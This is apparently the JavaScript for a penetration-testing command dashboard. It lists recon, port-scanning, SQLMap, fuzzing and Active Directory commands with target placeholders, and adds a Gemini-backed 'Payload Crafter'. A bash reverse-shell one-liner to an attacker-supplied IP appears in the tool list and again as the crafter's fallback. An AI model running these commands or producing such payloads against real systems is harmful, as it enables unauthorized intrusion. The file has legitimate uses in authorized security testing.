const STORAGE_KEYS = {
  target: 'hub_target',
  ip: 'hub_ip',
  selector: 'hub_selector',
  wordlist: 'hub_wordlist',
  favs: 'hub_favs'
};

const apiKey = '';

const defaultToolsData = [
  { id: 'ai_1', category: '✨ AI Assistants', name: '✨ Payload Crafter', badge: 'Gemini', desc: 'Describe required payload in plain language. AI returns usable command.', isAI: true, aiType: 'builder', tags: ['ai', 'payload'] },
  { id: 'ai_2', category: '✨ AI Assistants', name: '✨ Recon Analyzer', badge: 'Gemini', desc: 'Paste logs/output and get concise findings + next commands.', isAI: true, aiType: 'analyzer', tags: ['ai', 'analysis'] },
  { id: 'pr_1', category: 'Passive Recon', name: 'Subfinder', badge: 'Domains', desc: 'Fast passive subdomain enumeration.', cmd: 'subfinder -d [TARGET] -all -silent | anew subs.txt', tags: ['passive', 'subdomains'] },
  { id: 'pr_2', category: 'Passive Recon', name: 'Amass Enum', badge: 'Domains', desc: 'In-depth passive asset discovery.', cmd: 'amass enum -passive -d [TARGET] | anew subs.txt', tags: ['passive', 'subdomains', 'asn'] },
  { id: 'dns_1', category: 'DNS & Resolution', name: 'PureDNS Resolve', badge: 'Resolver', desc: 'Mass resolve subdomains with trusted resolvers.', cmd: 'puredns resolve subs.txt -r resolvers.txt -w resolved.txt', tags: ['active', 'dns'] },
  { id: 'wp_1', category: 'Web Probing', name: 'Httpx', badge: 'Prober', desc: 'Identify live hosts and technologies.', cmd: 'cat resolved.txt | httpx -title -tech-detect -status-code -silent -nc | anew live_web.txt', tags: ['active', 'http'] },
  { id: 'ps_1', category: 'Port Scanning', name: 'Naabu', badge: 'Scanner', desc: 'Fast TCP port scanning.', cmd: 'naabu -host [TARGET] -p - -silent -c 50 | anew ports.txt', tags: ['active', 'ports', 'tcp'] },
  { id: 'vuln_1', category: 'Vulnerability Scanning', name: 'Nuclei (Criticals)', badge: 'Nuclei', desc: 'Scan for critical/high severity findings.', cmd: 'nuclei -l live_web.txt -t nuclei-templates/ -s critical,high -o nuclei_high.txt', tags: ['active', 'vuln', 'critical'] },
  { id: 'web_1', category: 'Web Exploitation', name: 'SQLMap (Batch)', badge: 'SQLi', desc: 'Automated SQLi on a target parameter.', cmd: 'sqlmap -u "https://[TARGET]/page.php?id=1" --batch --random-agent --dbs --level=3 --risk=2', tags: ['active', 'sqli'] },
  { id: 'fuzz_1', category: 'Directory Fuzzing', name: 'FFUF (Web Dirs)', badge: 'Fuzzer', desc: 'Directory fuzzing with common response filters.', cmd: 'ffuf -w [WORDLIST] -u https://[TARGET]/FUZZ -mc 200,204,301,302,307,401,403 -o ffuf_dirs.json', tags: ['active', 'fuzzing', 'dirs'] },
  { id: 'cloud_1', category: 'Cloud & Secrets', name: 'Trufflehog', badge: 'Secrets', desc: 'Find credentials in Git repositories.', cmd: 'trufflehog github --repo https://github.com/[TARGET]', tags: ['passive', 'secrets', 'git'] },
  { id: 'ad_1', category: 'Active Directory', name: 'BloodHound Python', badge: 'AD', desc: 'Ingest AD graph data from Linux.', cmd: 'python3 bloodhound.py -u [SELECTOR] -p "Password" -d [TARGET] -ns [IP] -c All', tags: ['active', 'ad'] },
  { id: 'sh_1', category: 'Exploitation & Shells', name: 'Bash One-Liner', badge: 'Payload', desc: 'Classic bash reverse shell.', cmd: "bash -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'", tags: ['offline', 'payload', 'linux'] },
  { id: 'sh_2', category: 'Exploitation & Shells', name: 'Searchsploit', badge: 'Exploits', desc: 'Search Exploit-DB offline.', cmd: 'searchsploit [SELECTOR] --json', tags: ['offline', 'exploit'] },
  { id: 'ch_1', category: 'One-Liner Chains', name: 'Full Recon Chain', badge: 'Chain', desc: 'Passive enum → resolve → web probe → nuclei.', cmd: 'subfinder -d [TARGET] -silent | puredns resolve -r resolvers.txt | httpx -silent | nuclei -t nuclei-templates/ -o chain_results.txt', tags: ['active', 'chain', 'recon'] }
];

let state = { target: '', ip: '', selector: '', wordlist: '', search: '', category: 'All Tools', favorites: [], filterFav: false, filterTag: null, filterOffline: false, tools: [] };
let chartInstance = null;

const debounce = (fn, wait) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), wait); }; };
const byId = id => document.getElementById(id);

function el(tag, attributes = {}, ...children) {
  const node = document.createElement(tag);
  Object.entries(attributes).forEach(([key, value]) => {
    if (key.startsWith('on') && typeof value === 'function') node.addEventListener(key.slice(2).toLowerCase(), value);
    else if (key === 'className') node.className = value;
    else if (key === 'textContent') node.textContent = value;
    else if (value !== undefined && value !== null) node.setAttribute(key, value);
  });
  children.forEach(child => {
    if (typeof child === 'string') node.appendChild(document.createTextNode(child));
    else if (child instanceof Node) node.appendChild(child);
  });
  return node;
}

function showToast(message, isError = false) {
  const toast = byId('toast');
  byId('toastMsg').textContent = message;
  toast.className = `fixed bottom-5 right-5 font-bold px-4 py-2 rounded transform transition-all z-50 flex items-center shadow-lg fade-in ${isError ? 'bg-cyberalert text-white' : 'bg-cyberemerald text-black shadow-cyberemerald/20'}`;
  toast.classList.remove('translate-y-24', 'opacity-0');
  setTimeout(() => toast.classList.add('translate-y-24', 'opacity-0'), 2200);
}

async function secureCopy(text) {
  try {
    if (navigator.clipboard && window.isSecureContext) await navigator.clipboard.writeText(text);
    else throw new Error('No modern clipboard');
    showToast('Command Copied!');
  } catch {
    const area = document.createElement('textarea');
    area.value = text; area.style.position = 'fixed'; area.style.left = '-9999px';
    document.body.appendChild(area); area.select();
    document.execCommand('copy'); area.remove();
    showToast('Command Copied (fallback)!');
  }
}

function getReplacedCommand(cmd = '') {
  return cmd
    .replace(/\[TARGET\]/g, state.target || '[TARGET]')
    .replace(/\[IP\]/g, state.ip || '[IP]')
    .replace(/\[SELECTOR\]/g, state.selector || '[SELECTOR]')
    .replace(/\[WORDLIST\]/g, state.wordlist || '[WORDLIST]');
}

function updateStatusBar() {
  const warnings = [];
  if (state.target && !/^([a-z0-9-]+\.)+[a-z]{2,}$/i.test(state.target) && !/^\d+\.\d+\.\d+\.\d+$/.test(state.target)) warnings.push('Target format looks unusual');
  if (state.ip && !/^(\d{1,3}\.){3}\d{1,3}$/.test(state.ip)) warnings.push('LHOST looks invalid');
  byId('statusBar').textContent = warnings.length ? `⚠ ${warnings.join(' | ')}` : 'Ready. Tip: Press Ctrl + K to focus search.';
}

function saveState() {
  localStorage.setItem(STORAGE_KEYS.target, state.target);
  localStorage.setItem(STORAGE_KEYS.ip, state.ip);
  localStorage.setItem(STORAGE_KEYS.selector, state.selector);
  localStorage.setItem(STORAGE_KEYS.wordlist, state.wordlist);
  localStorage.setItem(STORAGE_KEYS.favs, JSON.stringify(state.favorites));
}

function loadState() {
  state.target = localStorage.getItem(STORAGE_KEYS.target) || '';
  state.ip = localStorage.getItem(STORAGE_KEYS.ip) || '';
  state.selector = localStorage.getItem(STORAGE_KEYS.selector) || '';
  state.wordlist = localStorage.getItem(STORAGE_KEYS.wordlist) || '';
  state.favorites = JSON.parse(localStorage.getItem(STORAGE_KEYS.favs) || '[]');
  byId('inputTarget').value = state.target;
  byId('inputIP').value = state.ip;
  byId('inputSelector').value = state.selector;
  byId('inputWordlist').value = state.wordlist;
}

function resetState() {
  state.target = ''; state.ip = ''; state.selector = ''; state.wordlist = ''; state.search = '';
  state.filterTag = null; state.filterFav = false; state.filterOffline = false;
  byId('inputTarget').value = '';
  byId('inputIP').value = '';
  byId('inputSelector').value = '';
  byId('inputWordlist').value = '';
  byId('inputSearch').value = '';
  byId('filterFavBtn').classList.remove('bg-yellow-500/20', 'text-yellow-500', 'border-yellow-500');
  byId('filterOfflineBtn').classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky');
  document.querySelectorAll('.filter-tag').forEach(b => b.classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky'));
  saveState();
  updateUIRender();
  showToast('State reset complete');
}

function isValidTool(item) {
  return item && typeof item.id === 'string' && typeof item.category === 'string' && typeof item.name === 'string' && typeof item.desc === 'string' && Array.isArray(item.tags);
}

function renderSidebar() {
  const nav = byId('categoryNav');
  nav.innerHTML = '';
  const categories = ['All Tools', ...new Set(state.tools.map(t => t.category))];
  categories.forEach(cat => {
    const isActive = state.category === cat;
    const btn = el('button', {
      className: `w-full text-left px-4 py-2 text-sm rounded transition-colors flex items-center ${isActive ? 'bg-cybersky/10 text-cybersky border-l-2 border-cybersky font-bold' : 'text-slate-400 hover:bg-slate-800/50 hover:text-white'}`,
      onClick: () => {
        state.category = cat;
        renderSidebar();
        if (window.innerWidth < 768) toggleSidebar();
        byId('overviewSection').classList.toggle('hidden', cat !== 'All Tools');
        updateUIRender();
      }
    }, `${getCategoryIcon(cat)} ${cat}`);
    nav.appendChild(btn);
  });
}

function getCategoryIcon(cat) {
  return ({ 'All Tools': '⚡', 'Passive Recon': '📡', 'DNS & Resolution': '🌍', 'Web Probing': '🕸️', 'Port Scanning': '🚪', 'Vulnerability Scanning': '☢️', 'Web Exploitation': '💉', 'Directory Fuzzing': '📚', 'Cloud & Secrets': '☁️', 'Active Directory': '🏰', 'Exploitation & Shells': '💥', 'One-Liner Chains': '⛓️', '✨ AI Assistants': '✨' }[cat] || '🔧');
}

function toggleFavorite(id, btn) {
  const i = state.favorites.indexOf(id);
  if (i > -1) { state.favorites.splice(i, 1); btn.textContent = '☆'; btn.classList.replace('text-yellow-500', 'text-slate-500'); }
  else { state.favorites.push(id); btn.textContent = '⭐'; btn.classList.replace('text-slate-500', 'text-yellow-500'); }
  saveState();
  if (state.filterFav) updateUIRender();
}

function updateUIRender() {
  const grid = byId('toolsGrid');
  const empty = byId('emptyState');
  byId('currentCategoryTitle').textContent = state.category;
  updateStatusBar();

  const filtered = state.tools.filter(t => {
    const matchCat = state.category === 'All Tools' || t.category === state.category;
    const searchIn = `${t.name} ${t.desc} ${(t.tags || []).join(' ')}`.toLowerCase();
    const matchSearch = searchIn.includes(state.search);
    const matchFav = !state.filterFav || state.favorites.includes(t.id);
    const matchTag = !state.filterTag || (t.tags || []).includes(state.filterTag);
    const matchOffline = !state.filterOffline || (t.tags || []).includes('offline');
    return matchCat && matchSearch && matchFav && matchTag && matchOffline;
  });

  byId('toolCountLabel').textContent = `${filtered.length} Command${filtered.length === 1 ? '' : 's'} Ready`;
  grid.innerHTML = '';

  if (!filtered.length) {
    grid.classList.add('hidden');
    empty.classList.remove('hidden');
    empty.classList.add('flex');
    return;
  }

  grid.classList.remove('hidden');
  empty.classList.add('hidden');
  empty.classList.remove('flex');
  filtered.forEach(tool => grid.appendChild(tool.isAI ? buildAICard(tool) : buildToolCard(tool)));
}

function buildToolCard(t) {
  const cmd = getReplacedCommand(t.cmd);
  const isFav = state.favorites.includes(t.id);
  const card = el('div', { className: 'bg-cybercard rounded-lg p-5 neon-border flex flex-col h-full relative group fade-in' });
  const head = el('div', { className: 'flex justify-between items-start mb-3' });
  const left = el('div', {}, el('h3', { className: 'text-base md:text-lg font-bold text-white', textContent: t.name }), el('span', { className: 'inline-block mt-1 px-2 py-0.5 bg-slate-800 text-cybersky text-[10px] uppercase font-bold tracking-wider rounded', textContent: t.badge }));
  const right = el('div', { className: 'flex gap-2' });
  const explain = el('button', { className: 'text-[10px] bg-slate-800 hover:bg-cybersky hover:text-black text-slate-300 px-2 py-1 rounded', textContent: '✨ Explain', onClick: () => handleExplain(t) });
  const fav = el('button', { className: `text-lg ${isFav ? 'text-yellow-500' : 'text-slate-500 hover:text-yellow-500'}`, textContent: isFav ? '⭐' : '☆', onClick: e => toggleFavorite(t.id, e.target) });
  right.append(explain, fav); head.append(left, right);

  const desc = el('p', { className: 'text-xs md:text-sm text-slate-400 mb-4 flex-1', textContent: t.desc });
  const term = el('div', { className: 'terminal-box p-3 rounded text-sm relative' });
  const copy = el('button', { className: 'copy-btn absolute right-2 top-2 bg-slate-800 hover:bg-cybersky hover:text-black text-white p-1 rounded', textContent: '📋', onClick: () => secureCopy(cmd) });
  const code = el('code', { textContent: `$ ${cmd}` });
  term.append(copy, code);

  const explainBox = el('div', { id: `explain-${t.id}`, className: 'hidden mt-3 text-xs md:text-sm text-cybersky bg-[#020617] p-3 rounded border border-cyberborder whitespace-pre-wrap' });
  card.append(head, desc, term, explainBox);
  return card;
}

function buildAICard(t) {
  const card = el('div', { className: 'bg-cybercard rounded-lg p-5 neon-border flex flex-col h-full relative group col-span-1 xl:col-span-2 fade-in' });
  card.append(el('h3', { className: 'text-lg md:text-xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-cybersky to-cyberemerald', textContent: t.name }));
  card.append(el('p', { className: 'text-sm text-slate-400 my-3', textContent: t.desc }));
  const input = el('textarea', { rows: t.aiType === 'analyzer' ? '5' : '3', className: 'w-full bg-[#020617] border border-cyberborder rounded px-3 py-2 text-white text-sm mb-3', placeholder: t.aiType === 'builder' ? 'Describe payload requirements...' : 'Paste scan output here...' });
  const button = el('button', { className: 'bg-slate-800 hover:bg-slate-700 border border-cyberborder text-white text-sm font-bold py-2 px-4 rounded mb-3 self-start', textContent: `✨ ${t.aiType === 'builder' ? 'Craft Payload' : 'Analyze Output'}` });
  const out = el('div', { className: 'terminal-box p-4 rounded text-sm whitespace-pre-wrap', textContent: 'Awaiting input...' });
  button.onclick = () => (t.aiType === 'builder' ? handleAIBuilder(input, out, button) : handleAIAnalyzer(input, out, button));
  card.append(input, button, out);
  return card;
}

async function handleExplain(tool) {
  const box = byId(`explain-${tool.id}`);
  box.classList.remove('hidden');
  const cmd = getReplacedCommand(tool.cmd);
  if (!apiKey) {
    box.textContent = `Local explain: ${tool.name}\n- Purpose: ${tool.desc}\n- Command: ${cmd}\n- Tip: Fill [TARGET]/[IP]/[WORDLIST] accurately before running.`;
    return;
  }
  box.textContent = 'Analyzing...';
  try {
    box.textContent = await callGemini(`Explain this command and flags: ${cmd}`, 'Keep concise.');
  } catch (e) {
    box.textContent = `Explain failed: ${e.message}`;
  }
}

async function handleAIBuilder(input, out, button) {
  if (!input.value.trim()) return;
  button.disabled = true; out.textContent = 'Crafting...';
  if (!apiKey) {
    out.textContent = `No API key configured.\nFallback template:\n$ bash -c 'bash -i >& /dev/tcp/${state.ip || '[IP]'}/4444 0>&1'`;
    button.disabled = false; return;
  }
  try {
    out.textContent = await callGemini(`Target: ${state.target}\nLHOST: ${state.ip}\nNeed: ${input.value}`, 'Return only one command, no markdown codeblock.');
  } catch (e) {
    out.textContent = `Error: ${e.message}`;
  }
  button.disabled = false;
}

async function handleAIAnalyzer(input, out, button) {
  if (!input.value.trim()) return;
  button.disabled = true; out.textContent = 'Analyzing...';
  if (!apiKey) {
    out.textContent = 'No API key configured. Fallback advice: Identify open ports, suspicious HTTP responses, weak services, then run targeted Nmap/Nuclei checks.';
    button.disabled = false; return;
  }
  try {
    out.textContent = await callGemini(input.value, 'Summarize key findings and suggest next 2 commands.');
  } catch (e) {
    out.textContent = `Error: ${e.message}`;
  }
  button.disabled = false;
}

async function callGemini(prompt, instruction) {
  const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }], systemInstruction: { parts: [{ text: instruction }] } })
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  const data = await res.json();
  return data?.candidates?.[0]?.content?.parts?.[0]?.text || 'No response';
}

function getChartData() {
  const counts = {};
  state.tools.forEach(t => { if (!t.isAI) counts[t.category] = (counts[t.category] || 0) + 1; });
  return { labels: Object.keys(counts), datasets: [{ data: Object.values(counts), backgroundColor: ['#38bdf8', '#10b981', '#f43f5e', '#a855f7', '#f59e0b', '#3b82f6', '#14b8a6', '#8b5cf6', '#ec4899', '#f97316'], borderWidth: 1, borderColor: '#020617' }] };
}

function initChart() {
  if (!window.Chart) {
    byId('overviewSection').insertAdjacentElement('beforeend', el('p', { className: 'text-yellow-500 text-xs mt-2', textContent: 'Chart.js failed to load, overview chart disabled.' }));
    return;
  }
  const ctx = byId('arsenalChart').getContext('2d');
  chartInstance = new Chart(ctx, { type: 'doughnut', data: getChartData(), options: { responsive: true, maintainAspectRatio: false, cutout: '72%', plugins: { legend: { labels: { color: '#cbd5e1', font: { size: 10 } } } } } });
}

function updateChart() {
  if (!chartInstance) return;
  chartInstance.data = getChartData();
  chartInstance.update();
}

function toggleSidebar() {
  byId('sidebar').classList.toggle('-translate-x-full');
  byId('mobileOverlay').classList.toggle('hidden');
}

function setupEvents() {
  const onInput = debounce((k, v) => { state[k] = v; saveState(); updateUIRender(); }, 220);
  byId('inputTarget').addEventListener('input', e => onInput('target', e.target.value.trim()));
  byId('inputIP').addEventListener('input', e => onInput('ip', e.target.value.trim()));
  byId('inputSelector').addEventListener('input', e => onInput('selector', e.target.value.trim()));
  byId('inputWordlist').addEventListener('input', e => onInput('wordlist', e.target.value.trim()));
  byId('inputSearch').addEventListener('input', e => onInput('search', e.target.value.toLowerCase()));

  byId('openSidebarBtn').addEventListener('click', toggleSidebar);
  byId('closeSidebarBtn').addEventListener('click', toggleSidebar);
  byId('mobileOverlay').addEventListener('click', toggleSidebar);

  byId('filterFavBtn').addEventListener('click', e => { state.filterFav = !state.filterFav; e.target.classList.toggle('bg-yellow-500/20'); e.target.classList.toggle('text-yellow-500'); e.target.classList.toggle('border-yellow-500'); updateUIRender(); });

  document.querySelectorAll('.filter-tag').forEach(btn => btn.addEventListener('click', e => {
    const tag = e.target.dataset.tag;
    if (state.filterTag === tag) { state.filterTag = null; e.target.classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky'); }
    else {
      document.querySelectorAll('.filter-tag').forEach(b => b.classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky'));
      state.filterTag = tag;
      e.target.classList.add('bg-cybersky/20', 'text-cybersky', 'border-cybersky');
    }
    updateUIRender();
  }));

  byId('filterOfflineBtn').addEventListener('click', e => {
    state.filterOffline = !state.filterOffline;
    e.target.classList.toggle('bg-cybersky/20');
    e.target.classList.toggle('text-cybersky');
    e.target.classList.toggle('border-cybersky');
    updateUIRender();
  });

  byId('clearFiltersBtn').addEventListener('click', resetState);
  byId('btnResetState').addEventListener('click', resetState);

  byId('btnExport').addEventListener('click', () => {
    const data = { tools: state.tools, exportedAt: new Date().toISOString() };
    const link = el('a', { href: `data:text/json;charset=utf-8,${encodeURIComponent(JSON.stringify(data, null, 2))}`, download: 'arsenal_config.json' });
    link.click();
  });

  byId('btnImport').addEventListener('change', e => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
      try {
        const parsed = JSON.parse(ev.target.result);
        const imported = Array.isArray(parsed) ? parsed : parsed.tools;
        if (!Array.isArray(imported)) throw new Error('JSON must contain an array or {tools: []}');
        const valid = imported.filter(isValidTool);
        if (!valid.length) throw new Error('No valid tools found');
        state.tools = valid;
        state.category = 'All Tools';
        renderSidebar();
        updateUIRender();
        updateChart();
        showToast(`Imported ${valid.length} tools`);
      } catch (err) {
        showToast(`Import failed: ${err.message}`, true);
      }
    };
    reader.readAsText(file);
  });

  document.addEventListener('keydown', e => {
    if (e.ctrlKey && e.key.toLowerCase() === 'k') { e.preventDefault(); byId('inputSearch').focus(); }
    if (e.key === 'Escape' && window.innerWidth < 768 && !byId('sidebar').classList.contains('-translate-x-full')) toggleSidebar();
  });
}

function init() {
  loadState();
  state.tools = [...defaultToolsData];
  renderSidebar();
  initChart();
  setupEvents();
  updateUIRender();
}

window.addEventListener('load', init);
